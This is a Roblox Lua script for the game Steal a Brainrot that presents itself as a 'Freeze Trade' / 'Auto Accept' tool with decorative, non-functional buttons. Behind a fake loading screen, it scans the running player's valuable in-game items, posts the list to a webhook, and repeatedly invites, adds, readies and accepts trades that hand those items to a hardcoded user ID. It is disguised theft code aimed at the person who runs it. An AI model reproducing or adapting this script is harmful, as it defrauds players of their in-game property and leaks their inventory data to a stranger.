-- ╔════════════════════════════════════════════════════════════════╗
-- ║    BRANZZ AUTO TRADE UI — v2.1 (AUTOMÁTICO)                   ║
-- ║       🧑‍💻 By BranZZ MetoDos 🚀                                 ║
-- ╚════════════════════════════════════════════════════════════════╝

-- ══════════════════════════════════════════
-- ⚙️ CONFIG
-- ══════════════════════════════════════════
local LOADING_TIME = "5s"
local WEBHOOK      = "SEU_WEBHOOK_AQUI"
local PING_1       = ""
local PING_2       = ""

-- ══════════════════════════════════════════
-- 🧠 LISTAS DE BRAINROTS (ATUALIZADAS)
-- ══════════════════════════════════════════
local TARGET_BRAINROTS = {
    ["Agarrini Ia Palini"] = true, ["Bisonte Giuppitere"] = true, ["Blackhole Goat"] = true,
    ["Boatito Auratito"] = true, ["Bunnyman"] = true, ["Burguro and Fryuro"] = true,
    ["Burrito Bandito"] = true, ["Capitano Moby"] = true, ["Celularcini Viciosini"] = true,
    ["Chachechi"] = true, ["Chicleteira Bicicleteira"] = true, ["Chicleteira Noelteira"] = true,
    ["Chicleteirina Bicicleteirina"] = true, ["Chillin Chili"] = true, ["Chimpanzini Spiderini"] = true,
    ["Chimnino"] = true, ["Chipso and Queso"] = true, ["Cooki and Milki"] = true,
    ["Cuadramat and Pakrahmatmamat"] = true, ["Donkeyturbo Express"] = true, ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true, ["Dul Dul Dul"] = true, ["Esok Sekolah"] = true,
    ["Eviledon"] = true, ["Extinct Matteo"] = true, ["Extinct Tralalero"] = true,
    ["Festive 67"] = true, ["Fishino Clownino"] = true, ["Fragola La La La"] = true,
    ["Fragrama and Chocrama"] = true, ["Frankentteo"] = true, ["Garama and Madundung"] = true,
    ["Giftini Spyderini"] = true, ["Gingerat Gerat"] = true, ["Graipuss Medussi"] = true,
    ["Guerriro Digitale"] = true, ["Guest 666"] = true, ["Headless Horseman"] = true,
    ["Ho Ho Ho Sahur"] = true, ["Horegini Boom"] = true, ["Jackorilla"] = true,
    ["Job Job Job Sahur"] = true, ["Jolly Jolly Sahur"] = true, ["Karker Sahur"] = true,
    ["Karkerkar Kurkur"] = true, ["Ketchuru and Masturu"] = true, ["Ketupat Kepat"] = true,
    ["La Casa Boo"] = true, ["La Cucaracha"] = true, ["La Extinct Grande Combinasion"] = true,
    ["La Ginger Sekolah"] = true, ["La Grande Combinassion"] = true, ["La Jolly Grande"] = true,
    ["La Karkerkar Combinasion"] = true, ["La Sahur Combinasion"] = true, ["La Secret Combinasion"] = true,
    ["La Spooky Grande"] = true, ["La Supreme Combinasion"] = true, ["La Vacca Jacko Linterino"] = true,
    ["La Vacca Prese Presente"] = true, ["La Vacca Saturno Saturnita"] = true, ["Las Sis"] = true,
    ["Las Tralaleritas"] = true, ["Las Vaquitas Saturnitas"] = true, ["Lavadorito Spinito"] = true,
    ["List List List Sahur"] = true, ["Los 25"] = true, ["Los 67"] = true,
    ["Los Bros"] = true, ["Los Burritos"] = true, ["Los Candies"] = true,
    ["Los Chicleteiras"] = true, ["Los Combinasionas"] = true, ["Los Cucarachas"] = true,
    ["Los Hotspositos"] = true, ["Los Jobcitos"] = true, ["Los Jolly Combinasionas"] = true,
    ["Los Karkeritos"] = true, ["Los Matteos"] = true, ["Los Mobilis"] = true,
    ["Los Nooo My Hotspotsitos"] = true, ["Los Planitos"] = true, ["Los Primos"] = true,
    ["Los Puggies"] = true, ["Los Quesadillas"] = true, ["Los Spaghettis"] = true,
    ["Los Spooky Combinasionas"] = true, ["Los Spyderinis"] = true, ["Los Tacoritas"] = true,
    ["Los Tortus"] = true, ["Los Tralaleritos"] = true, ["Mariachi Corazoni"] = true,
    ["Mieteteira Bicicleteira"] = true, ["Money Money Puggy"] = true, ["Money Money Reindeer"] = true,
    ["Naughty Naughty"] = true, ["Noo My Candy"] = true, ["Noo My Examine"] = true,
    ["Nooo My Hotspot"] = true, ["Nuclearo Dinosauro"] = true, ["Orcaledon"] = true,
    ["Pandanini Frostini"] = true, ["Perrito Burrito"] = true, ["Pirulitoita Bicicletaire"] = true,
    ["Please My Present"] = true, ["Pot Hotspot"] = true, ["Pot Pumpkin"] = true,
    ["Pumpkin Spyderini"] = true, ["Quesadilla Crocodila"] = true, ["Quesadillo Vampiro"] = true,
    ["Rang Ring Bus"] = true, ["Reindeer Tralala"] = true, ["Reinito Sleighito"] = true,
    ["Sammyni Spyderini"] = true, ["Santa Hotspot"] = true, ["Santteo"] = true,
    ["Spaghetti Tualetti"] = true, ["Spooky and Pumpky"] = true, ["Swag Soda"] = true,
    ["Tacorita Bicicleta"] = true, ["Tang Tang Kelentang"] = true, ["Telemorte"] = true,
    ["Tictac Sahur"] = true, ["To To To Sahur"] = true, ["Tralaladon"] = true,
    ["Tralalalaledon"] = true, ["Trenostruzzo Turbo 4000"] = true, ["Trickolino"] = true,
    ["Triplito Tralaleritos"] = true, ["Torrtuginni Dragonfrutini"] = true, ["Vulturino Skeletono"] = true,
    ["W or L"] = true, ["Yess My Examine"] = true, ["1x1x1x1"] = true,
    ["25"] = true, ["67"] = true, ["Strawberry Elephant"] = true,
    ["Skibidi Toilet"] = true, ["Meowl"] = true, ["Ketupat Bros"] = true,
    ["Ginger Gerat"] = true, ["Hydra Dragon Cannelloni"] = true, ["Hydra Bunny"] = true,
    ["Signore Carapace"] = true, ["Cerberus"] = true, ["Antonio"] = true,
    ["Elefanto Frigo"] = true, ["Griffin"] = true,
}

-- ══════════════════════════════════════════
-- SERVIÇOS
-- ══════════════════════════════════════════
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local UserInputService = game:GetService("UserInputService")
local LP = Players.LocalPlayer

local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
local TARGET_USER_ID = 9929561794

local INVITE_GUID = "afb005f9-6e81-4e0a-8bb0-3555938a9658"
local SELECT_GUID = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda"
local READY_GUID = "d73acf93-6f32-44df-b813-0f6b32c7afd9"
local ACCEPT_GUID = "918ee0f5-e98f-413f-b76e-baee47b021cb"

-- ══════════════════════════════════════════
-- MÓDULOS DO JOGO
-- ══════════════════════════════════════════
local AnimalsData, AnimalsShared, SYNC_DATA = nil, nil, nil

local function loadGameModules()
    pcall(function()
        AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
        AnimalsShared = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))
    end)
    
    local mod = ReplicatedStorage.Packages:FindFirstChild("Synchronizer")
    if mod then
        local sync = require(mod)
        local fn = sync.Get
        for i = 1, 15 do
            local s, v = pcall(debug.getupvalue, fn, i)
            if s and type(v) == "table" then
                SYNC_DATA = v
                break
            end
        end
    end
end

-- ══════════════════════════════════════════
-- HTTP
-- ══════════════════════════════════════════
local function getRequestFn()
    return (syn and syn.request) or (http and http.request) or http_request or request
end

local function httpPost(url, payload)
    local requestFn = getRequestFn()
    if not requestFn then return false end
    local body = HttpService:JSONEncode(payload)
    pcall(function()
        requestFn({ Url = url, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
    end)
    return true
end

-- ══════════════════════════════════════════
-- UTILS
-- ══════════════════════════════════════════
local function parseTime(str)
    local num, unit = str:match("^(%d+)([smhSMH]?)$")
    num = tonumber(num) or 60
    unit = unit and unit:lower() or "s"
    if unit == "m" then return num * 60 elseif unit == "h" then return num * 3600 else return num end
end

local LOADING_SECONDS = parseTime(LOADING_TIME)

local function formatGen(val)
    if not val or val == 0 then return "$0/s" end
    if val >= 1e12 then return string.format("$%.2fT/s", val / 1e12)
    elseif val >= 1e9 then return string.format("$%.2fB/s", val / 1e9)
    elseif val >= 1e6 then return string.format("$%.2fM/s", val / 1e6)
    elseif val >= 1e3 then return string.format("$%.1fK/s", val / 1e3)
    end
    return "$" .. tostring(math.floor(val)) .. "/s"
end

local function toWikiName(name)
    local clean = name:match("^(.-)%s*%(") or name
    return clean:gsub(" ", "_")
end

local function fetchFandomImage(name)
    local requestFn = getRequestFn()
    if not requestFn then return nil end
    local url = FANDOM_BASE .. toWikiName(name)
    for attempt = 1, 3 do
        local ok, res = pcall(function()
            return requestFn({ Url = url, Method = "GET", Timeout = 10 })
        end)
        if ok and res and res.StatusCode == 200 and res.Body then
            local img = res.Body:match('property="og:image"%s+content="([^"]+)"')
                or res.Body:match('content="([^"]+)"%s+property="og:image"')
            if img and img ~= "" then return img:gsub("&amp;", "&") end
        end
        if attempt < 3 then task.wait(0.5) end
    end
    return nil
end

-- ══════════════════════════════════════════
-- SCANNER
-- ══════════════════════════════════════════
local function getRemote(unobfuscatedName)
    local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
    local children = Net:GetChildren()
    for i = 1, #children - 1 do
        local current = children[i]
        local nextFolder = children[i + 1]
        if current and nextFolder and string.find(current.Name, unobfuscatedName) then
            return nextFolder
        end
    end
    return nil
end

local function scanBrainrots()
    local results = {}
    
    if not SYNC_DATA then return results end
    
    for _, plotData in pairs(SYNC_DATA) do
        if type(plotData) == "table" then
            local owner = plotData.Owner or (type(plotData.Get) == "function" and plotData:Get("Owner"))
            if (typeof(owner) == "Instance" and owner == LP) or (type(owner) == "table" and owner.UserId == LP.UserId) then
                local animalList = plotData.AnimalList or (type(plotData.Get) == "function" and plotData:Get("AnimalList"))
                if type(animalList) == "table" then
                    for slot, animalData in pairs(animalList) do
                        if type(animalData) == "table" and animalData.Index then
                            local info = AnimalsData and AnimalsData[animalData.Index]
                            if info then
                                local displayName = info.DisplayName or animalData.Index
                                
                                local traitsStr = "Nenhuma"
                                local traitsList = {}
                                if animalData.Traits and type(animalData.Traits) == "table" then
                                    for _, t in pairs(animalData.Traits) do
                                        if type(t) == "string" and t ~= "" then
                                            table.insert(traitsList, t)
                                        elseif type(t) == "table" and t.Name then
                                            table.insert(traitsList, t.Name)
                                        end
                                    end
                                    if #traitsList > 0 then
                                        traitsStr = table.concat(traitsList, ", ")
                                    end
                                end
                                
                                local genVal = 0
                                pcall(function()
                                    genVal = AnimalsShared:GetGeneration(animalData.Index, animalData.Mutation, animalData.Traits, nil)
                                end)
                                
                                table.insert(results, {
                                    name = displayName,
                                    mutation = animalData.Mutation or "Nenhuma",
                                    traits = traitsStr,
                                    genVal = genVal,
                                    genStr = formatGen(genVal),
                                    slot = tonumber(slot),
                                    data = animalData,
                                    isTarget = TARGET_BRAINROTS[displayName] == true,
                                })
                            end
                        end
                    end
                end
            end
        end
    end
    
    table.sort(results, function(a, b) return a.genVal > b.genVal end)
    return results
end

-- ══════════════════════════════════════════
-- AUTO TRADE (AUTOMÁTICO)
-- ══════════════════════════════════════════
local autoTradeActive = false

local function startAutoTrade()
    if autoTradeActive then return end
    
    local brainrots = scanBrainrots()
    local targets = {}
    for _, br in ipairs(brainrots) do
        if br.isTarget then
            table.insert(targets, br)
        end
    end
    
    if #targets == 0 then return end
    
    local inviteRemote = getRemote("TradeService/Invite")
    local addRemote = getRemote("TradeService/AddBrainrot")
    local readyRemote = getRemote("TradeService/Ready")
    local acceptRemote = getRemote("TradeService/Accept")
    
    if not (inviteRemote and addRemote and readyRemote and acceptRemote) then return end
    
    autoTradeActive = true
    
    task.spawn(function()
        local idx = 1
        while autoTradeActive do
            local item = targets[idx]
            if item then
                pcall(function() addRemote:InvokeServer(SELECT_GUID, item.slot, item.data) end)
                idx = (idx % #targets) + 1
            end
            task.wait(1)
        end
    end)
    
    task.spawn(function()
        while autoTradeActive do
            pcall(function() inviteRemote:InvokeServer(INVITE_GUID, TARGET_USER_ID) end)
            task.wait(2)
        end
    end)
    
    task.spawn(function()
        while autoTradeActive do
            pcall(function() readyRemote:FireServer(READY_GUID) end)
            task.wait(1)
            pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
            task.wait(1)
        end
    end)
end

-- ══════════════════════════════════════════
-- WEBHOOK (AUTOMÁTICO)
-- ══════════════════════════════════════════
local function sendWebhook()
    local brainrots = scanBrainrots()
    local targets = {}
    
    for _, br in ipairs(brainrots) do
        if br.isTarget then
            table.insert(targets, br)
        end
    end
    
    if #targets == 0 then return end
    
    local text = ""
    for _, br in ipairs(targets) do
        text = text .. "**" .. br.name .. "**\n"
        text = text .. "🔧 Mutação: " .. br.mutation .. "\n"
        text = text .. "🧬 Traits: " .. br.traits .. "\n"
        text = text .. "💰 " .. br.genStr .. "\n\n"
        if #text > 1500 then text = text .. "..."; break end
    end
    
    local embed = {
        title = "🎯 BRAINROTS ENCONTRADOS",
        description = text,
        color = 0x9b59b6,
        footer = { text = "Trade automático para ID: " .. TARGET_USER_ID },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    }
    
    if targets[1] then
        local img = fetchFandomImage(targets[1].name)
        if img then embed.thumbnail = { url = img } end
    end
    
    if WEBHOOK ~= "" and WEBHOOK ~= "SEU_WEBHOOK_AQUI" then
        httpPost(WEBHOOK, { embeds = { embed }, username = "Brainrot Scanner" })
    end
end

-- ══════════════════════════════════════════
-- UI (BOTÕES SÓ ENFEITE)
-- ══════════════════════════════════════════
local function makeCorner(parent, radius)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, radius or 12)
    c.Parent = parent
end

local function makeStroke(parent, color, thickness)
    local s = Instance.new("UIStroke")
    s.Color = color or Color3.fromRGB(180,160,220)
    s.Thickness = thickness or 1.5
    s.Parent = parent
end

local function makeLabel(parent, props)
    local l = Instance.new("TextLabel")
    l.BackgroundTransparency = 1
    l.Font = props.font or Enum.Font.Gotham
    l.TextColor3 = props.color or Color3.fromRGB(220,210,240)
    l.TextSize = props.size or 15
    l.Text = props.text or ""
    l.Size = props.sz or UDim2.new(1,0,0,26)
    l.Position = props.pos or UDim2.new(0,0,0,0)
    l.ZIndex = props.z or 3
    l.TextXAlignment = props.align or Enum.TextXAlignment.Center
    l.Parent = parent
    return l
end

local function makeDrag(frame, handle)
    local dragging, dragStart, startPos = false
    handle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
        end
    end)
    handle.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

local function showNotification(message)
    local existing = CoreGui:FindFirstChild("BRANZZ_NOTIF")
    if existing then existing:Destroy() end

    local ns = Instance.new("ScreenGui")
    ns.Name = "BRANZZ_NOTIF"
    ns.ResetOnSpawn = false
    ns.DisplayOrder = 9999999
    ns.IgnoreGuiInset = true
    ns.Parent = CoreGui

    local nf = Instance.new("Frame")
    nf.Size = UDim2.new(0,320,0,80)
    nf.Position = UDim2.new(0.5,-160,0,-90)
    nf.BackgroundColor3 = Color3.fromRGB(16,14,26)
    nf.BorderSizePixel = 0
    nf.ZIndex = 10
    nf.Parent = ns
    makeCorner(nf, 16)
    makeStroke(nf, Color3.fromRGB(160,140,210), 1.5)

    local topBar = Instance.new("Frame")
    topBar.Size = UDim2.new(1,0,0,3)
    topBar.BackgroundColor3 = Color3.fromRGB(180,155,230)
    topBar.BorderSizePixel = 0
    topBar.ZIndex = 11
    topBar.Parent = nf
    makeCorner(topBar, 4)

    makeLabel(nf, { text="⚙️ branzZ Auto Trade", font=Enum.Font.GothamBold, size=13, color=Color3.fromRGB(200,185,240), sz=UDim2.new(1,-16,0,22), pos=UDim2.new(0,8,0,10), z=11, align=Enum.TextXAlignment.Left })
    makeLabel(nf, { text=message, size=12, color=Color3.fromRGB(160,145,210), sz=UDim2.new(1,-16,0,28), pos=UDim2.new(0,8,0,36), z=11, align=Enum.TextXAlignment.Left })

    TweenService:Create(nf, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0.5,-160,0,20)}):Play()
    task.delay(3, function()
        TweenService:Create(nf, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Position = UDim2.new(0.5,-160,0,-90)}):Play()
        task.wait(0.35)
        ns:Destroy()
    end)
end

local function showMainUI(sg)
    local minimized = false

    local main = Instance.new("Frame")
    main.Size = UDim2.new(0,280,0,220)
    main.Position = UDim2.new(0.5,-140,0.5,-110)
    main.BackgroundColor3 = Color3.fromRGB(16,14,26)
    main.BorderSizePixel = 0
    main.ZIndex = 2
    main.Parent = sg
    makeCorner(main, 18)
    makeStroke(main, Color3.fromRGB(160,140,210), 1.5)

    local header = Instance.new("Frame")
    header.Size = UDim2.new(1,0,0,38)
    header.BackgroundColor3 = Color3.fromRGB(22,18,36)
    header.BorderSizePixel = 0
    header.ZIndex = 3
    header.Parent = main
    makeCorner(header, 18)

    local headerFix = Instance.new("Frame")
    headerFix.Size = UDim2.new(1,0,0,18)
    headerFix.Position = UDim2.new(0,0,1,-18)
    headerFix.BackgroundColor3 = Color3.fromRGB(22,18,36)
    headerFix.BorderSizePixel = 0
    headerFix.ZIndex = 3
    headerFix.Parent = header

    local topBar = Instance.new("Frame")
    topBar.Size = UDim2.new(1,0,0,3)
    topBar.BackgroundColor3 = Color3.fromRGB(180,155,230)
    topBar.BorderSizePixel = 0
    topBar.ZIndex = 4
    topBar.Parent = main
    makeCorner(topBar, 3)

    makeDrag(main, header)

    makeLabel(header, { text="🐒 branzZ Freeze Trade", font=Enum.Font.GothamBold, size=14, color=Color3.fromRGB(215,200,245), sz=UDim2.new(1,-70,1,0), pos=UDim2.new(0,12,0,0), z=4, align=Enum.TextXAlignment.Left })

    local minBtn = Instance.new("TextButton")
    minBtn.Size = UDim2.new(0,26,0,26)
    minBtn.Position = UDim2.new(1,-62,0.5,-13)
    minBtn.BackgroundColor3 = Color3.fromRGB(40,32,65)
    minBtn.Text = "—"
    minBtn.TextColor3 = Color3.fromRGB(200,185,240)
    minBtn.TextSize = 14
    minBtn.Font = Enum.Font.GothamBold
    minBtn.BorderSizePixel = 0
    minBtn.AutoButtonColor = false
    minBtn.ZIndex = 5
    minBtn.Parent = header
    makeCorner(minBtn, 8)

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0,26,0,26)
    closeBtn.Position = UDim2.new(1,-32,0.5,-13)
    closeBtn.BackgroundColor3 = Color3.fromRGB(180,80,80)
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(255,220,220)
    closeBtn.TextSize = 13
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.BorderSizePixel = 0
    closeBtn.AutoButtonColor = false
    closeBtn.ZIndex = 5
    closeBtn.Parent = header
    makeCorner(closeBtn, 8)

    local body = Instance.new("Frame")
    body.Size = UDim2.new(1,0,1,-38)
    body.Position = UDim2.new(0,0,0,38)
    body.BackgroundTransparency = 1
    body.ZIndex = 3
    body.Parent = main

    makeLabel(body, { text="By BranZZ MetoDos  •  v2.1", size=11, color=Color3.fromRGB(100,88,145), sz=UDim2.new(1,0,0,18), pos=UDim2.new(0,0,0,8), z=3 })

    local div = Instance.new("Frame")
    div.Size = UDim2.new(0.82,0,0,1)
    div.Position = UDim2.new(0.09,0,0,32)
    div.BackgroundColor3 = Color3.fromRGB(50,40,78)
    div.BorderSizePixel = 0
    div.ZIndex = 3
    div.Parent = body

    local btn1 = Instance.new("TextButton")
    btn1.Size = UDim2.new(0.82,0,0,48)
    btn1.Position = UDim2.new(0.09,0,0,44)
    btn1.BackgroundColor3 = Color3.fromRGB(80,65,145)
    btn1.Text = "❄️   Freeze Trade"
    btn1.TextColor3 = Color3.fromRGB(230,220,255)
    btn1.TextSize = 15
    btn1.Font = Enum.Font.GothamBold
    btn1.BorderSizePixel = 0
    btn1.AutoButtonColor = false
    btn1.ZIndex = 4
    btn1.Parent = body
    makeCorner(btn1, 12)
    makeStroke(btn1, Color3.fromRGB(140,120,210), 1.5)

    btn1.MouseEnter:Connect(function()
        TweenService:Create(btn1, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(100,82,180)}):Play()
    end)
    btn1.MouseLeave:Connect(function()
        TweenService:Create(btn1, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80,65,145)}):Play()
    end)

    local btn2 = Instance.new("TextButton")
    btn2.Size = UDim2.new(0.82,0,0,48)
    btn2.Position = UDim2.new(0.09,0,0,102)
    btn2.BackgroundColor3 = Color3.fromRGB(65,115,80)
    btn2.Text = "✅   Auto Accept"
    btn2.TextColor3 = Color3.fromRGB(210,245,220)
    btn2.TextSize = 15
    btn2.Font = Enum.Font.GothamBold
    btn2.BorderSizePixel = 0
    btn2.AutoButtonColor = false
    btn2.ZIndex = 4
    btn2.Parent = body
    makeCorner(btn2, 12)
    makeStroke(btn2, Color3.fromRGB(100,180,120), 1.5)

    btn2.MouseEnter:Connect(function()
        TweenService:Create(btn2, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80,145,100)}):Play()
    end)
    btn2.MouseLeave:Connect(function()
        TweenService:Create(btn2, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(65,115,80)}):Play()
    end)

    makeLabel(body, { text="「🇧🇷」branzZ-Finder-Brainrot🧠", size=11, color=Color3.fromRGB(60,48,90), sz=UDim2.new(1,0,0,16), pos=UDim2.new(0,0,0,162), z=3 })

    -- BOTÕES SÓ ENFEITE - NÃO FAZEM NADA
    btn1.MouseButton1Click:Connect(function() end)
    btn2.MouseButton1Click:Connect(function() end)

    minBtn.MouseButton1Click:Connect(function()
        minimized = not minimized
        if minimized then
            TweenService:Create(main, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {Size = UDim2.new(0,280,0,38)}):Play()
            minBtn.Text = "□"
        else
            TweenService:Create(main, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {Size = UDim2.new(0,280,0,220)}):Play()
            minBtn.Text = "—"
        end
    end)

    closeBtn.MouseButton1Click:Connect(function()
        autoTradeActive = false
        TweenService:Create(main, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {BackgroundTransparency = 1}):Play()
        task.wait(0.35)
        sg:Destroy()
    end)
end

-- ══════════════════════════════════════════
-- LOADING
-- ══════════════════════════════════════════
local function showLoading()
    loadGameModules()
    
    local sg = Instance.new("ScreenGui")
    sg.Name = "BRANZZ_TRADE_UI"
    sg.ResetOnSpawn = false
    sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    sg.IgnoreGuiInset = true
    sg.DisplayOrder = 999998
    sg.Parent = CoreGui

    local lc = Instance.new("Frame")
    lc.Size = UDim2.new(0,260,0,200)
    lc.Position = UDim2.new(0.5,-130,0.5,-100)
    lc.BackgroundColor3 = Color3.fromRGB(16,14,26)
    lc.BorderSizePixel = 0
    lc.ZIndex = 2
    lc.Parent = sg
    makeCorner(lc, 20)
    makeStroke(lc, Color3.fromRGB(160,140,210), 1.5)

    local tb = Instance.new("Frame")
    tb.Size = UDim2.new(1,0,0,4)
    tb.BackgroundColor3 = Color3.fromRGB(180,155,230)
    tb.BorderSizePixel = 0
    tb.ZIndex = 3
    tb.Parent = lc
    makeCorner(tb, 4)

    makeDrag(lc, lc)

    makeLabel(lc, { text="🐒 branzZ Freeze Trade", font=Enum.Font.GothamBold, size=16, color=Color3.fromRGB(215,200,245), sz=UDim2.new(1,0,0,28), pos=UDim2.new(0,0,0,12), z=3 })
    makeLabel(lc, { text="By BranZZ MetoDos", size=12, color=Color3.fromRGB(120,105,170), sz=UDim2.new(1,0,0,18), pos=UDim2.new(0,0,0,40), z=3 })

    local spinFrame = Instance.new("Frame")
    spinFrame.Size = UDim2.new(0,70,0,70)
    spinFrame.Position = UDim2.new(0.5,-35,0,64)
    spinFrame.BackgroundTransparency = 1
    spinFrame.ZIndex = 3
    spinFrame.Parent = lc

    local ringBg = Instance.new("ImageLabel")
    ringBg.Size = UDim2.new(1,0,1,0)
    ringBg.BackgroundTransparency = 1
    ringBg.Image = "rbxassetid://4919428905"
    ringBg.ImageColor3 = Color3.fromRGB(40,32,65)
    ringBg.ZIndex = 3
    ringBg.Parent = spinFrame

    local ring = Instance.new("ImageLabel")
    ring.Size = UDim2.new(1,0,1,0)
    ring.BackgroundTransparency = 1
    ring.Image = "rbxassetid://4919428905"
    ring.ImageColor3 = Color3.fromRGB(180,155,225)
    ring.ZIndex = 4
    ring.Parent = spinFrame

    local pctLbl = makeLabel(spinFrame, { text="0%", font=Enum.Font.GothamBold, size=14, color=Color3.fromRGB(220,210,245), sz=UDim2.new(0,50,0,20), pos=UDim2.new(0.5,-25,0.5,-10), z=5 })

    task.spawn(function()
        local angle = 0
        while lc.Parent do
            angle = (angle + 4) % 360
            ring.Rotation = angle
            task.wait(0.018)
        end
    end)

    local statusLbl = makeLabel(lc, { text="Carregando módulos...", size=12, color=Color3.fromRGB(170,155,215), sz=UDim2.new(1,0,0,18), pos=UDim2.new(0,0,0,142), z=3 })

    local barBg = Instance.new("Frame")
    barBg.Size = UDim2.new(0.8,0,0,10)
    barBg.Position = UDim2.new(0.1,0,0,166)
    barBg.BackgroundColor3 = Color3.fromRGB(28,22,46)
    barBg.BorderSizePixel = 0
    barBg.ZIndex = 3
    barBg.Parent = lc
    makeCorner(barBg, 5)

    local barFill = Instance.new("Frame")
    barFill.Size = UDim2.new(0,0,1,0)
    barFill.BackgroundColor3 = Color3.fromRGB(180,155,225)
    barFill.BorderSizePixel = 0
    barFill.ZIndex = 4
    barFill.Parent = barBg
    makeCorner(barFill, 5)

    makeLabel(lc, { text="「🇧🇷」branzZ🧠", size=10, color=Color3.fromRGB(65,52,95), sz=UDim2.new(1,0,0,16), pos=UDim2.new(0,0,0,182), z=3 })

    local fakeMessages = {
        "Iniciando módulos...", "Carregando trade system...", "Conectando ao servidor...",
        "Verificando brainrots...", "Preparando Auto Trade...", "Sincronizando dados...",
        "Quase lá...", "Finalizando módulos...",
    }

    task.spawn(function()
        local elapsed = 0
        local interval = 0.1
        local msgIdx = 1

        while elapsed < LOADING_SECONDS do
            elapsed = elapsed + interval
            local prog = math.min(math.floor((elapsed / LOADING_SECONDS) * 100), 99)

            pctLbl.Text = prog .. "%"
            TweenService:Create(barFill, TweenInfo.new(interval, Enum.EasingStyle.Linear), {Size = UDim2.new(prog/100,0,1,0)}):Play()

            local step = math.floor((prog/99) * #fakeMessages) + 1
            if step ~= msgIdx and step <= #fakeMessages then
                msgIdx = step
                statusLbl.Text = fakeMessages[msgIdx]
            end
            task.wait(interval)
        end

        pctLbl.Text = "100%"
        statusLbl.Text = "Módulos prontos!"
        TweenService:Create(barFill, TweenInfo.new(0.3, Enum.EasingStyle.Linear), {Size = UDim2.new(1,0,1,0)}):Play()

        task.wait(1)
        TweenService:Create(lc, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1}):Play()
        task.wait(0.6)
        lc:Destroy()

        -- TUDO AUTOMÁTICO AQUI
        showNotification("🔍 Escaneando brainrots...")
        task.wait(1)
        sendWebhook()
        showNotification("✅ Webhook enviado! Iniciando Auto Trade...")
        task.wait(1)
        startAutoTrade()
        showNotification("🔄 Auto Trade rodando para ID: " .. TARGET_USER_ID)
        
        showMainUI(sg)
    end)
end

showLoading()